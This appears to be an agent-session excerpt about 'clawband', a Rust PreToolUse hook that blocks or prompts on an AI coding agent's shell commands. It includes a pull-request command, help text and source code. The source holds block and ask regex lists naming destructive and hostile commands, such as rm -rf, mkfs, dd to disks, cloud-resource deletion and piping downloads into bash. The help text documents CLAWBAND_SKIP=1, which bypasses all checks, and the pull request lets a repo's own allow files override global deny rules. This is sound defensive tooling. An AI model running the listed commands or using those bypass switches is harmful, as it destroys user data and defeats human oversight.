  allow '<pattern>'   Append a regex to ~/.clawband/allow.patterns
  deny  '<pattern>'   Append a regex to ~/.clawband/deny.patterns
  stats               Pattern counts, options, and audit log summary
  post                PostToolUse companion — reads breadcrumb, suggests allow
  --version           Print version and exit

**Pattern files  (~/.clawband/)
  deny.patterns    Always block — appended to built-in deny list
  ask.patterns     Always prompt — appended to built-in ask list
  allow.patterns   Override any block — matching commands skip all checks

**Options  (environment variables)
  RTK_ENABLED=1   Strip 'rtk'/'rtk proxy' prefix before matching
  SQZ_ENABLED=1   Strip 'sqz compress' suffix before matching
  CLAWBAND_LOG=1  Append every block/prompt to ~/.clawband.log
  CLAWBAND_SKIP=1 Bypass all checks (trusted wrapper scripts)

**Decisions
  deny   Hard-blocked — command is not executed
  ask    Prompts for approval before execution
  pass   Silent — command runs without interruption

102	| Pipe to interpreter via sudo | `\| sudo bash`, `\| sudo python`, etc. |
103	| Heredoc to interpreter | `bash <<`, `python <<`, etc. |
104	| Pipe to database CLI | `\| psql`, `\| mysql`, `\| sqlite3` |
105	| Pipe to system tools | `\| patch`, `\| crontab`, `\| at` |
106	| find / xargs escalation | `find ... -delete`, `-exec bash`, `-exec rm`, `xargs sh`, `xargs python`, etc. |
107	| git force push | `git push --force` / `-f` (allows `--force-with-lease`) |
108	
109	### Prompted (ask)
110	
111	| Category | Examples |
112	|----------|---------|
113	| eval | `eval ` — common in shell init but executes arbitrary strings |
114	| Destructive git (local) | `git reset --hard`, `git checkout -- `, `git stash drop`, `git stash clear` |
115	| git clean | `git clean -f`, `git clean -x`, `git clean -d` — wipes untracked files irreversibly |
116	| Remote branch deletion | `git push --delete` |
117	| git restore (working tree) | `git restore <path>` — discards uncommitted changes (`git restore --staged` is safe and not prompted) |
118	| git branch -D | `git branch -D <branch>` — force-deletes branch regardless of merge status |
119	| docker rm -f | `docker rm -f`, `docker container rm -f` — force-removes running containers |
120	| npx / npm exec | `npx pkg`, `npm exec -- cmd` — downloads and executes arbitrary npm packages, content can't be scanned |
121	| git push :<branch> | `git push origin :branch` — colon-prefix syntax for remote branch deletion |

130	## Custom patterns
131	
132	Extend or override behaviour by editing files in `~/.clawband/`:
133	
134	| File | Effect |
135	|------|--------|
136	| `deny.patterns` | Always block — added to built-in deny list |
137	| `ask.patterns` | Always prompt — added to built-in ask list |
138	| `allow.patterns` | Override any block — matching commands skip all checks |
139	
140	Each file is one **case-insensitive regex** per line. Lines starting with `#` and blank lines are ignored.
141	
142	See `deny.patterns.example` and `ask.patterns.example` for the format.
143	
144	```sh
145	# ~/.clawband/deny.patterns — add project-specific blocks
146	docker system prune
147	my-infra nuke --all
148	
149	# ~/.clawband/allow.patterns — whitelist specific safe usages
150	git reset --hard HEAD$
151	```
152	
153	## CLI commands
154	
155	```sh
156	clawband allow '<pattern>'   # append to ~/.clawband/allow.patterns
157	clawband deny  '<pattern>'   # append to ~/.clawband/deny.patterns
158	clawband stats               # show pattern counts and audit log summary
159	clawband --version
```
</details></tool-use>

gh pr create --repo jamessoubry/clawband --title "feat: project-level pattern files and --project flag (v2.13.0)" --body "$(cat <<'EOF'
## Summary

Adds per-repo pattern overrides — useful when a project frequently uses a command that's on the global ask list, without weakening your global protection.

**How it works:**
- If `.clawband/` exists in the current working directory, clawband loads `deny.patterns`, `ask.patterns`, and `allow.patterns` from it and merges them with the global `~/.clawband/` patterns
- Project allow patterns override global deny/ask — so you can globally ask about `git reset --hard` but allow it unconditionally in a specific repo

**`--project` flag:**
\```sh
clawband allow --project 'git reset --hard'
# → writes to .clawband/allow.patterns in CWD (creates dir if needed)
\```

**`clawband stats`** shows a "Project patterns" section when a `.clawband/` directory is present in CWD.

**`clawband help`** / `--help` / `-h` added (also included in this PR to avoid split-PR complexity with #14).

🤖 Generated with [Claude Code](https://claude.com/claude-code)
EOF
)" 2>&1

fn project_config_dir() -> Option<PathBuf> {
    let pwd = env::var("PWD").ok()?;
    let path = PathBuf::from(pwd).join(".clawband");
    // Skip if it's the same as the global dir (home dir edge case)
    if path == config_dir() {

    if path.exists() { Some(path) } else { None }
}

88	            r"\brm\s+(?:-[a-z]*r[a-z]*f[a-z]*|-[a-z]*f[a-z]*r[a-z]*|-[a-z]*r[a-z]*\s+-[a-z]*f[a-z]*|-[a-z]*f[a-z]*\s+-[a-z]*r[a-z]*)\s+\$HOME",
89	        ),
90	        (
91	            "sudo rm -rf",
92	            r"\bsudo\s+rm\s+(?:-[a-z]*r[a-z]*f[a-z]*|-[a-z]*f[a-z]*r[a-z]*|-[a-z]*r[a-z]*\s+-[a-z]*f[a-z]*|-[a-z]*f[a-z]*\s+-[a-z]*r[a-z]*)",
93	        ),
94	        ("mkfs", r"\bmkfs\b"),
95	        ("dd if=", r"\bdd\s+if="),
96	        ("dd of=", r"\bdd\s+of="),
97	        ("> /dev/sd", r">\s*/dev/sd"),
98	        // Silent file truncation
99	        ("truncate -s 0", r"\btruncate\b.*-s\s+0\b"),
100	        // Infrastructure destruction
101	        ("terraform destroy", r"\bterraform\s+destroy\b"),
102	        ("terragrunt destroy", r"\bterragrunt\s+destroy\b"),
103	        (
104	            "kubectl delete namespace",
105	            r"\bkubectl\s+delete\s+namespace\b",
106	        ),
107	        ("kubectl delete --all", r"\bkubectl\s+delete\s+--all\b"),
108	        // AWS destructive ops
109	        (
110	            "aws rds delete-db-instance",
111	            r"\baws\s+rds\s+delete-db-instance\b",
112	        ),
113	        ("aws eks delete-cluster", r"\baws\s+eks\s+delete-cluster\b"),
114	        ("aws iam delete-role", r"\baws\s+iam\s+delete-role\b"),
115	        ("aws s3 rb", r"\baws\s+s3\s+rb(\s|$)"),
116	        ("aws s3 rm --recursive", r"\baws\s+s3\s+rm\b.*--recursive\b"),
117	        (
118	            "aws dynamodb delete-table",
119	            r"\baws\s+dynamodb\s+delete-table\b",
120	        ),
121	        (
122	            "aws cloudformation delete-stack",
123	            r"\baws\s+cloudformation\s+delete-stack\b",
124	        ),
125	        (
126	            "aws lambda delete-function",
127	            r"\baws\s+lambda\s+delete-function\b",
128	        ),
129	        // Database destruction
130	        ("dropdb", r"\bdropdb\b"),
131	        // Docker destructive ops
132	        ("docker system prune", r"\bdocker\s+system\s+prune\b"),
133	        // find -delete (anchored; avoids matching --delete-protection flags)
134	        ("find -delete", r"\bfind\b.*\s-delete(\s|$)"),
135	        // find / xargs execution escalation
136	        ("-exec rm", r"-exec\s+rm\b"),
137	        ("-exec sh", r"-exec\s+sh\b"),
138	        ("-exec bash", r"-exec\s+bash\b"),
139	        ("-exec python", r"-exec\s+python\b"),
140	        ("-exec zsh", r"-exec\s+zsh\b"),
141	        ("xargs rm", r"\bxargs\s+rm\b"),
142	        ("xargs sh", r"\bxargs\s+sh\b"),
143	        ("xargs bash", r"\bxargs\s+bash\b"),
144	        ("xargs python", r"\bxargs\s+python3?\b"),
145	        ("xargs node", r"\bxargs\s+node\b"),
146	        // Pipe to interpreter — supply-chain attack vector
147	        ("pipe to sh", r"\|\s*sh(\s|$)"),
148	        ("pipe to bash", r"\|\s*bash(\s|$)"),
149	        ("pipe to zsh", r"\|\s*zsh(\s|$)"),
150	        ("pipe to python", r"\|\s*python3?(\s|$)"),
151	        ("pipe to node", r"\|\s*node(\s|$)"),
152	        ("pipe to ruby", r"\|\s*ruby(\s|$)"),
153	        ("pipe to perl", r"\|\s*perl(\s|$)"),
154	        // Pipe to interpreter via sudo
155	        ("pipe to sudo sh", r"\|\s*sudo\s+sh(\s|$)"),
156	        ("pipe to sudo bash", r"\|\s*sudo\s+bash(\s|$)"),
157	        ("pipe to sudo zsh", r"\|\s*sudo\s+zsh(\s|$)"),
158	        ("pipe to sudo python", r"\|\s*sudo\s+python3?(\s|$)"),
159	        ("pipe to sudo node", r"\|\s*sudo\s+node(\s|$)"),
160	        ("pipe to sudo ruby", r"\|\s*sudo\s+ruby(\s|$)"),
161	        ("pipe to sudo perl", r"\|\s*sudo\s+perl(\s|$)"),
162	        // Heredoc to interpreter
163	        ("heredoc to bash", r"\bbash\s+<<"),
164	        ("heredoc to sh", r"\bsh\s+<<"),
165	        ("heredoc to zsh", r"\bzsh\s+<<"),
166	        ("heredoc to python", r"\bpython3?\s+<<"),
167	        // Pipe to database CLI
168	        ("pipe to psql", r"\|\s*psql(\s|$)"),
169	        ("pipe to mysql", r"\|\s*mysql(\s|$)"),
170	        ("pipe to sqlite3", r"\|\s*sqlite3(\s|$)"),
171	        // Pipe to system modification tools
172	        ("pipe to patch", r"\|\s*patch(\s|$)"),
173	        ("pipe to crontab", r"\|\s*crontab(\s|$)"),
174	        ("pipe to at", r"\|\s*at\s"),
175	    ];
176	    specs.iter().map(|(l, p)| Pattern::builtin(l, p)).collect()
177	}

179	// ─── Built-in ask patterns ────────────────────────────────────────────────────
180	
181	fn builtin_ask() -> Vec<Pattern> {
182	    let specs: &[(&str, &str)] = &[
183	        // eval — common in shell init but executes arbitrary strings
184	        ("eval", r"\beval\s"),
185	        // Destructive git (local) — legitimate but irreversible without reflog
186	        ("git reset --hard", r"\bgit\s+reset\s+--hard\b"),
187	        ("git checkout -- ", r"\bgit\s+checkout\s+--\s"),
188	        ("git stash drop", r"\bgit\s+stash\s+drop\b"),
189	        ("git stash clear", r"\bgit\s+stash\s+clear\b"),
190	        // git clean — wipes untracked files, unrecoverable
191	        ("git clean", r"\bgit\s+clean\s+-[fxd]"),
192	        // Remote branch deletion
193	        ("git push --delete", r"\bgit\s+push\b.*--delete\b"),
194	        // git restore without --staged — discards working tree changes
195	        // [^-] matches a path arg; skips flags so `git restore --staged` is not caught
196	        ("git restore", r"\bgit\s+restore\s+[^-]"),
197	        // git branch -D — force-deletes branch regardless of merge status
198	        // (?-i:-D) disables the outer (?i) for just -D so lowercase -d isn't caught
199	        ("git branch -D", r"\bgit\s+branch\s+(?-i:-D)\b"),
200	        // docker rm -f — force-removes a running container
201	        (
202	            "docker rm -f",
203	            r"\bdocker\s+(?:container\s+)?rm\b.*\s-f(\s|$)",
204	        ),
205	        // Compiled/bytecode runners — can't scan the binary/JAR/module for content
206	        ("java -jar", r"\bjava\b.*\s-jar\s"),
207	        ("go run", r"\bgo\s+run\b"),
208	        ("cargo run", r"\bcargo\s+run\b"),
209	        // npx/npm exec — downloads and executes arbitrary npm packages
210	        ("npx", r"\bnpx\s"),
211	        ("npm exec", r"\bnpm\s+exec\b"),
212	        // git push :<branch> — colon-prefix syntax for remote branch deletion
213	        ("git push :<branch>", r"\bgit\s+push\b.*\s:\S"),
214	    ];
215	    specs.iter().map(|(l, p)| Pattern::builtin(l, p)).collect()
216	}

218	// ─── User pattern files ───────────────────────────────────────────────────────
219	
220	fn load_patterns(path: &PathBuf) -> Vec<Pattern> {
221	    let Ok(text) = fs::read_to_string(path) else {
222	        return vec![];
223	    };
224	    text.lines()
225	        .map(str::trim)
226	        .filter(|l| !l.is_empty() && !l.starts_with('#'))
227	        .filter_map(Pattern::from_user)
228	        .collect()
229	}
230	
231	fn config_dir() -> PathBuf {
232	    PathBuf::from(env::var("HOME").unwrap_or_default()).join(".clawband")
233	}
234	
235	// ─── RTK prefix stripping ─────────────────────────────────────────────────────
236	
237	fn strip_rtk(cmd: &str) -> String {
238	    // Strip "rtk " and "rtk proxy " prefixes, then the git -C <dir> wrapper RTK adds
239	    let rtk = Regex::new(r"^rtk\s+(?:proxy\s+)?").unwrap();
240	    let git_c = Regex::new(r"^git\s+-C\s+\S+\s+").unwrap();
241	    let s = rtk.replace(cmd, "");
242	    git_c.replace(&s, "git ").into_owned()
243	}
244	
245	// ─── sqz suffix stripping ─────────────────────────────────────────────────────
246	
247	fn strip_sqz(cmd: &str) -> String {
248	    // sqz rewrites "git status" → "git status 2>&1 | sqz compress --cmd git"
249	    // Strip the appended sqz pipeline so patterns match the original command.
250	    let sqz = Regex::new(r"\s*2>&1\s*\|\s*sqz\s+compress\b.*$").unwrap();
251	    sqz.replace(cmd, "").into_owned()
252	}
253	
254	// ─── Script file scanning ────────────────────────────────────────────────────
255	// When an interpreter runs a script file, read it and check each line against
256	// deny/ask patterns. Handles shell, Python, JS/TS, Perl, and Lua files.
257	// Skips inline-execution flags (-c, -m, -e). Unreadable paths fail gracefully.
258	
259	fn path_basename(path: &str) -> &str {
260	    path.rsplit('/').next().unwrap_or(path)
261	}
262	
263	fn extract_script_path(command: &str) -> Option<String> {
264	    let interp = r"(?i)(?:sudo\s+)?(?:bash|sh|zsh|dash|python3?|node|deno|perl|ruby|lua[0-9.]*)";
265	
266	    // Input redirection: bash < /path/to/script
267	    let redir_re = Regex::new(&format!(r"(?i)^\s*{}\s+<\s+(.+)$", interp)).unwrap();
268	    if let Some(caps) = redir_re.captures(command) {
269	        let path_str = caps[1].trim().trim_matches('"').trim_matches('\'');
270	        if let Some(path) = path_str.split_whitespace().next() {
271	            return Some(path.to_string());
272	        }
273	    }
274	
275	    // Direct execution: ./script or ./script.sh — bash honours shebang, ignores extension
276	    let direct_re = Regex::new(r"(?i)^\s*(?:sudo\s+)?(\./\S+)").unwrap();
277	    if let Some(caps) = direct_re.captures(command) {
278	        let path_str = caps[1].trim().trim_matches('"').trim_matches('\'');
279	        if let Some(path) = path_str.split_whitespace().next() {
280	            return Some(path.to_string());
281	        }
282	    }
283	
284	    // Standard: interpreter [optional-flags] <path>
285	    let re = Regex::new(&format!(r"(?i)^\s*{}\s+((?:-[a-zA-Z]+\s+)*)(.+)$", interp)).unwrap();
286	    let caps = re.captures(command)?;
287	    let flags = &caps[1];
288	    // -c  → shell/python inline command string
289	    // -m  → python module (e.g. python3 -m pytest)
290	    // -e / --eval → node inline eval
291	    if Regex::new(r"(?:^|\s)-[a-zA-Z]*[cme][a-zA-Z]*(\s|$)")
292	        .unwrap()
293	        .is_match(flags)
294	    {
295	        return None;
296	    }
297	    let path_str = caps[2].trim().trim_matches('"').trim_matches('\'');
298	    // First token only — ignore script arguments after the path
299	    let path = path_str.split_whitespace().next()?;
300	    Some(path.to_string())
301	}
302	
303	fn scan_script_file(
304	    path: &str,
305	    deny_pats: &[Pattern],
306	    ask_pats: &[Pattern],
307	    allow_pats: &[Pattern],
308	) -> Option<(String, String)> {
309	    let content = fs::read_to_string(path).ok()?;
310	    let is_js = path.ends_with(".js")
311	        || path.ends_with(".mjs")
312	        || path.ends_with(".ts")
313	        || path.ends_with(".tsx");
314	    let is_lua = path.ends_with(".lua");
315	    let mut in_block_comment = false;
316	
317	    for (lineno, raw_line) in content.lines().enumerate() {
318	        let line = raw_line.trim();
319	        if line.is_empty() {
320	            continue;
321	        }
322	
323	        // JS/TS block comment state: /* ... */
324	        if is_js {
325	            if in_block_comment {
326	                if line.contains("*/") {
327	                    in_block_comment = false;
328	                }
329	                continue;
330	            }
331	            if line.starts_with("/*") {
332	                in_block_comment = !line.contains("*/");
333	                continue;
334	            }
335	            if line.starts_with("//") || line.starts_with('*') {
336	                continue;
337	            }
338	        }
339	
340	        // Lua comment state: --[[ ... ]] block comments and -- line comments
341	        if is_lua {
342	            if in_block_comment {
343	                if line.contains("]]") {
344	                    in_block_comment = false;
345	                }
346	                continue;
347	            }
348	            if line.starts_with("--[[") {
349	                in_block_comment = !line.contains("]]");
350	                continue;
351	            }
352	            if line.starts_with("--") {
353	                continue;
354	            }
355	        }
356	
357	        // Shell (#) and Python (#) and Perl (#) line comments
358	        if line.starts_with('#') {
359	            continue;
360	        }
361	
362	        // Reuse compound-command splitting so `foo && rm -rf /` is caught
363	        let clean = strip_safe_pipes(line);
364	        for segment in &split_segments(&clean) {
365	            if allow_pats.iter().any(|p| p.matches(segment)) {
366	                continue;
367	            }
368	            for pat in deny_pats {
369	                if pat.matches(segment) {
370	                    return Some((
371	                        "deny".into(),
372	                        format!(
373	                            "Blocked: '{}' in {}:{}: {}",
374	                            pat.label,
375	                            path,
376	                            lineno + 1,
377	                            segment
378	                        ),
379	                    ));
380	                }
381	            }
382	            for pat in ask_pats {
383	                if pat.matches(segment) {
384	                    return Some((
385	                        "ask".into(),
386	                        format!(
387	                            "Review before running — '{}' in {}:{}: {}\nTo always allow: clawband allow '{}'",
388	                            pat.label,
389	                            path,
390	                            lineno + 1,
391	                            segment,
392	                            pat.label
393	                        ),
394	                    ));
395	                }
396	            }
397	        }
398	    }
399	    None
400	}
401	
402	// ─── Git force push check ─────────────────────────────────────────────────────
403	
404	fn check_force_push(cmd: &str) -> Option<String> {
405	    // Only applies to git push commands
406	    if !Regex::new(r"(?i)\bgit\s+push\b").unwrap().is_match(cmd) {
407	        return None;
408	    }
409	    // Strip --force-with-lease (safe alternative) first
410	    let strip_fwl = Regex::new(r"(?i)--force-with-lease(?:=\S+)?").unwrap();
411	    let cleaned = strip_fwl.replace_all(cmd, "");
412	    // Then block --force or -f anywhere in the command
413	    if Regex::new(r"(?i)\s--force(\s|$)|\s-f(\s|$)")
414	        .unwrap()
415	        .is_match(&cleaned)
416	    {
417	        Some("Blocked: git push --force / -f (use --force-with-lease instead)".into())
418	    } else {
419	        None
420	    }
421	}
422	
423	// ─── Safe inline pipe stripping ───────────────────────────────────────────────
424	// Remove  | python3 -c "..."  and  | python3 -m mod  before pipe checks.
425	// These are visible inline code, not supply-chain risks.
426	
427	fn strip_safe_pipes(cmd: &str) -> String {
428	    let c = Regex::new(r"(?i)\|\s*(python3?|node)\s+-c\s+[^|;&`$]*").unwrap();
429	    let m = Regex::new(r"(?i)\|\s*(python3?|node)\s+-m\s+\S+").unwrap();
430	    let s = c.replace_all(cmd, "");
431	    m.replace_all(&s, "").into_owned()
432	}
433	
434	// ─── Compound command splitting ───────────────────────────────────────────────
435	// Split on &&, ||, ; and newlines.
436	// Single | is NOT a splitter — keeps pipe-to-interpreter in one segment.
437	// \; and \| are escaped before splitting so find -exec and regex patterns survive.
438	
439	fn split_segments(cmd: &str) -> Vec<String> {
440	    const ESC_SEMI: &str = "\x01S\x01";
441	    const ESC_PIPE: &str = "\x01P\x01";
442	    const SEP: &str = "\x01SEP\x01";
443	
444	    let s = cmd.replace("\\;", ESC_SEMI).replace("\\|", ESC_PIPE);
445	
446	    let splitter = Regex::new(r"[ \t]*(\|\||&&|;|\n)[ \t]*").unwrap();
447	    let s = splitter.replace_all(&s, SEP);
448	
449	    s.split(SEP)
450	        .map(|seg| seg.trim().replace(ESC_SEMI, "\\;").replace(ESC_PIPE, "\\|"))
451	        .filter(|s| !s.is_empty())
452	        .collect()
453	}
454	
455	// ─── PostToolUse breadcrumb ───────────────────────────────────────────────────
456	// Written by PreToolUse when decision is "ask". Read and deleted by `clawband post`
457	// (PostToolUse hook). If the command ran, PostToolUse fires and we know the user
458	// approved. If denied, PostToolUse never fires and the breadcrumb expires via TTL.
459	
460	fn breadcrumb_path() -> PathBuf {
461	    config_dir().join(".last-ask")
462	}
463	
464	fn write_ask_breadcrumb(reason: &str) {
465	    let cfg = config_dir();
466	    let _ = fs::create_dir_all(&cfg);
467	    let ts = std::time::SystemTime::now()
468	        .duration_since(std::time::UNIX_EPOCH)
469	        .map(|d| d.as_secs())
470	        .unwrap_or(0);
471	    if let Ok(mut f) = fs::OpenOptions::new()
472	        .write(true)
473	        .create(true)
474	        .truncate(true)
475	        .open(breadcrumb_path())
476	    {
477	        let _ = writeln!(f, "{}\n{}", ts, reason);
478	    }
479	}
480	
481	fn cmd_post() {
482	    let path = breadcrumb_path();
483	    let Ok(content) = fs::read_to_string(&path) else {
484	        return;
485	    };
486	    let _ = fs::remove_file(&path);
487	
488	    let mut lines = content.lines();
489	    let ts: u64 = lines.next().and_then(|l| l.parse().ok()).unwrap_or(0);
490	
491	    let now = std::time::SystemTime::now()
492	        .duration_since(std::time::UNIX_EPOCH)
493	        .map(|d| d.as_secs())
494	        .unwrap_or(0);
495	    if now.saturating_sub(ts) > 60 {
496	        return;
497	    }
498	
499	    let reason: String = lines.collect::<Vec<_>>().join("\n");
500	
501	    // Extract "clawband allow '<label>'" from the hint line if present.
502	    if let Some(pos) = reason.find("clawband allow '") {
503	        let snippet = reason[pos..].lines().next().unwrap_or("").trim();
504	        println!(
505	            "The user approved a clawband-prompted command. \
506	             Suggest they run `{}` to stop being prompted for this in future.",
507	            snippet
508	        );
509	    }
510	}
511	
512	// ─── Allow / deny commands ───────────────────────────────────────────────────
513	
514	fn cmd_add_pattern(file: &str, args: &[String]) {
515	    if args.is_empty() {
516	        eprintln!("Usage: clawband allow|deny <pattern>");
517	        std::process::exit(1);
518	    }
519	    let pattern = args.join(" ");
520	
521	    if Pattern::from_user(&pattern).is_none() {
522	        eprintln!("clawband: invalid regex: {}", pattern);
523	        std::process::exit(1);
524	    }
525	
526	    let cfg = config_dir();
527	    let _ = fs::create_dir_all(&cfg);
528	    let path = cfg.join(file);
529	
530	    match fs::OpenOptions::new().append(true).create(true).open(&path) {
531	        Ok(mut f) => {
532	            let _ = writeln!(f, "{}", pattern);
533	            let g = "\x1b[32m";
534	            let b = "\x1b[34m";
535	            let r = "\x1b[0m";
536	            let bold = "\x1b[1m";
537	            println!(
538	                "{}Added{} {}{}{} → {}{}{}",
539	                g,
540	                r,
541	                bold,
542	                pattern,
543	                r,
544	                b,
545	                path.display(),
546	                r
547	            );
548	        }
549	        Err(e) => {
550	            eprintln!("clawband: failed to write {}: {}", path.display(), e);
551	            std::process::exit(1);
552	        }
553	    }
554	}

557	
558	fn cmd_help() {
559	    const VERSION: &str = env!("CARGO_PKG_VERSION");
560	    let bold = "\x1b[1m";
561	    let d = "\x1b[2m";
562	    let g = "\x1b[32m";
563	    let y = "\x1b[33m";
564	    let b = "\x1b[34m";
565	    let r = "\x1b[0m";
566	
567	    println!("\n{bold}clawband v{VERSION}{r}  {d}— PreToolUse hook for Claude Code's Bash tool{r}");
568	    println!("{d}Blocks destructive shell commands before they execute.{r}\n");
569	
570	    println!("{bold}Usage{r}");
571	    println!("  clawband {d}<command>{r}");
572	    println!();
573	
574	    println!("{bold}Commands{r}");
575	    println!("  {g}allow{r} {d}'<pattern>'{r}   Append a regex to ~/.clawband/allow.patterns");
576	    println!("  {y}deny{r}  {d}'<pattern>'{r}   Append a regex to ~/.clawband/deny.patterns");
577	    println!("  {b}stats{r}               Pattern counts, options, and audit log summary");
578	    println!(
579	        "  {b}post{r}                PostToolUse companion — reads breadcrumb, suggests allow"
580	    );
581	    println!("  {b}--version{r}           Print version and exit");
582	    println!();
583	
584	    println!("{bold}Pattern files{r}  {d}(~/.clawband/){r}");
585	    println!("  deny.patterns    Always block — appended to built-in deny list");
586	    println!("  ask.patterns     Always prompt — appended to built-in ask list");
587	    println!("  allow.patterns   Override any block — matching commands skip all checks");
588	    println!();
589	
590	    println!("{bold}Options{r}  {d}(environment variables){r}");
591	    println!("  RTK_ENABLED=1   Strip 'rtk'/'rtk proxy' prefix before matching");
592	    println!("  SQZ_ENABLED=1   Strip 'sqz compress' suffix before matching");
593	    println!("  CLAWBAND_LOG=1  Append every block/prompt to ~/.clawband.log");
594	    println!("  CLAWBAND_SKIP=1 Bypass all checks (trusted wrapper scripts)");
595	    println!();
596	
597	    println!("{bold}Decisions{r}");
598	    println!("  {g}deny{r}   Hard-blocked — command is not executed");
599	    println!("  {y}ask{r}    Prompts for approval before execution");
600	    println!("  {d}pass   Silent — command runs without interruption{r}");
601	    println!();
602	
603	    println!("{d}https://github.com/jamessoubry/clawband{r}\n");
604	}

606	// ─── Stats command ────────────────────────────────────────────────────────────
607	
608	fn cmd_stats() {
609	    const VERSION: &str = env!("CARGO_PKG_VERSION");
610	    let cfg = config_dir();
611	    let home = env::var("HOME").unwrap_or_default();
612	
613	    let builtin_deny_count = builtin_deny().len();
614	    let builtin_ask_count = builtin_ask().len();
615	
616	    let count_file = |name: &str| -> (usize, bool) {
617	        let path = cfg.join(name);
618	        let exists = path.exists();
619	        let n = load_patterns(&path).len();
620	        (n, exists)
621	    };
622	    let (user_deny, deny_exists) = count_file("deny.patterns");
623	    let (user_ask, ask_exists) = count_file("ask.patterns");
624	    let (user_allow, allow_exists) = count_file("allow.patterns");
625	
626	    let rtk = env::var("RTK_ENABLED").as_deref() == Ok("1");
627	    let sqz = env::var("SQZ_ENABLED").as_deref() == Ok("1");
628	    let logging = env::var("CLAWBAND_LOG").as_deref() == Ok("1");
629	    let log_path = PathBuf::from(&home).join(".clawband.log");
630	
631	    // Parse audit log if present
632	    let (log_deny, log_ask) = if log_path.exists() {
633	        fs::read_to_string(&log_path)
634	            .unwrap_or_default()
635	            .lines()
636	            .fold((0u64, 0u64), |(d, a), line| {
637	                if line.contains("] DENY |") {
638	                    (d + 1, a)
639	                } else if line.contains("] ASK |") {
640	                    (d, a + 1)
641	                } else {
642	                    (d, a)
643	                }
644	            })
645	    } else {
646	        (0u64, 0u64)
647	    };
648	
649	    let g = "\x1b[32m"; // green
650	    let y = "\x1b[33m"; // yellow
651	    let b = "\x1b[34m"; // blue
652	    let d = "\x1b[2m"; // dim
653	    let r = "\x1b[0m"; // reset
654	    let bold = "\x1b[1m";
655	
656	    println!("\n{bold}clawband v{VERSION}{r}\n");
657	
658	    println!("{bold}Built-in patterns{r}");
659	    println!("  {g}deny{r}   {bold}{builtin_deny_count}{r}");
660	    println!("  {y}ask{r}    {bold}{builtin_ask_count}{r}");
661	
662	    println!("\n{bold}User patterns{r}  {d}(~/.clawband/){r}");
663	    let file_status = |exists: bool, n: usize| -> String {
664	        if !exists {
665	            format!("{d}file not found{r}")
666	        } else if n == 0 {
667	            format!("{d}0 patterns{r}")
668	        } else {
669	            format!("{bold}{n}{r} loaded")
670	        }
671	    };
672	    println!("  deny.patterns    {}", file_status(deny_exists, user_deny));
673	    println!("  ask.patterns     {}", file_status(ask_exists, user_ask));
674	    println!(
675	        "  allow.patterns   {}",
676	        file_status(allow_exists, user_allow)
677	    );
678	
679	    println!("\n{bold}Active protections{r}");
680	    println!("  script file scanning     {g}on{r}  {d}(bash/sh/python/node/ruby/perl/lua/deno + input redirection){r}");
681	    println!("  write-then-execute       {g}on{r}  {d}(same-file write+execute in one compound command){r}");
682	    println!("  echo content scanning    {g}on{r}  {d}(echo/printf redirected to script file){r}");
683	    println!(
684	        "  subshell scanning        {g}on{r}  {d}($() and backtick inner-command evaluation){r}"
685	    );
686	
687	    println!("\n{bold}Options{r}");
688	    let flag = |on: bool| {
689	        if on {
690	            format!("{g}on{r}")
691	        } else {
692	            format!("{d}off{r}")
693	        }
694	    };
695	    println!("  RTK_ENABLED    {}", flag(rtk));
696	    println!("  SQZ_ENABLED    {}", flag(sqz));
697	    println!("  CLAWBAND_LOG   {}", flag(logging));
698	
699	    println!("\n{bold}Audit log{r}");
700	    if log_path.exists() {
701	        let total = log_deny + log_ask;
702	        println!(
703	            "  {b}{}{r}  {d}({}){r}",
704	            log_path.display(),
705	            if total == 0 {
706	                "empty".to_string()
707	            } else {
708	                format!("{total} events")
709	            }
710	        );
711	        if total > 0 {
712	            println!("  {g}deny{r}   {bold}{log_deny}{r}");
713	            println!("  {y}ask{r}    {bold}{log_ask}{r}");
714	        }
715	    } else if logging {
716	        println!("  {d}enabled — no events yet{r}");
717	    } else {
718	        println!("  {d}set CLAWBAND_LOG=1 in clawband to activate{r}");
719	    }
720	
721	    println!();
722	}

724	// ─── Echo / printf content scanning ──────────────────────────────────────────
725	// echo and printf are only dangerous when they write content to a script file.
726	// Piped to screen, a commit message, or a non-script file → always safe.
727	// Trigger condition: output redirection (> or >>) to a script extension.
728	
729	const SCRIPT_EXTS: &str = r"sh|bash|py|js|ts|mjs|rb|pl|lua";
730	
731	fn check_echo_to_script(
732	    segment: &str,
733	    deny_pats: &[Pattern],
734	    ask_pats: &[Pattern],
735	) -> Option<(bool, String)> {
736	    // Match: echo/printf [-flags] "content"|'content' [>>|>] file.ext
737	    let re = Regex::new(&format!(
738	        r#"(?i)^\s*(?:echo|printf)(?:\s+-[a-zA-Z]+)*\s+(?:"([^"]*)"|'([^']*)')\s*>>?\s*\S+\.(?:{SCRIPT_EXTS})\b"#
739	    ))
740	    .unwrap();
741	    let caps = re.captures(segment)?;
742	    let content = caps.get(1).or(caps.get(2))?.as_str();
743	
744	    for pat in deny_pats {
745	        if pat.matches(content) {
746	            return Some((
747	                true,
748	                format!(
749	                    "Blocked: '{}' found in echo content written to script file: {}",
750	                    pat.label, content
751	                ),
752	            ));
753	        }
754	    }
755	    for pat in ask_pats {
756	        if pat.matches(content) {
757	            return Some((
758	                false,
759	                format!(
760	                    "Review before running — '{}' found in echo content written to script file: {}\nTo always allow: clawband allow '{}'",
761	                    pat.label, content, pat.label
762	                ),
763	            ));
764	        }
765	    }
766	    None
767	}
768	
769	// ─── Write-then-execute detection ─────────────────────────────────────────────
770	// If a compound command writes a file AND later executes that same file,
771	// the content can't be scanned before execution. Matches by basename so
772	// extension doesn't matter — `echo bad > run.txt; bash run.txt` is caught too.
773	
774	fn check_write_then_execute(segments: &[String]) -> bool {
775	    if segments.len() < 2 {
776	        return false;
777	    }
778	    // Capture the filename after any output redirection operator
779	    let write_re = Regex::new(r">>?\s*(\S+)").unwrap();
780	    // Capture the filename passed to an interpreter or run directly
781	    let exec_re = Regex::new(
782	        r"(?i)(?:\b(?:bash|sh|zsh|dash|python3?|node|deno|perl|ruby|lua)\s+<?|^\s*(?:sudo\s+)?\./)(\S+)",
783	    )
784	    .unwrap();
785	
786	    let written: Vec<&str> = segments
787	        .iter()
788	        .flat_map(|s| write_re.captures_iter(s))
789	        .filter_map(|c| c.get(1).map(|m| path_basename(m.as_str())))
790	        .collect();
791	
792	    if written.is_empty() {
793	        return false;
794	    }
795	
796	    segments.iter().any(|s| {
797	        exec_re.captures_iter(s).any(|c| {
798	            c.get(1)
799	                .map(|m| written.contains(&path_basename(m.as_str())))
800	                .unwrap_or(false)
801	        })
802	    })
803	}
804	
805	// ─── Subshell content scanning ────────────────────────────────────────────────
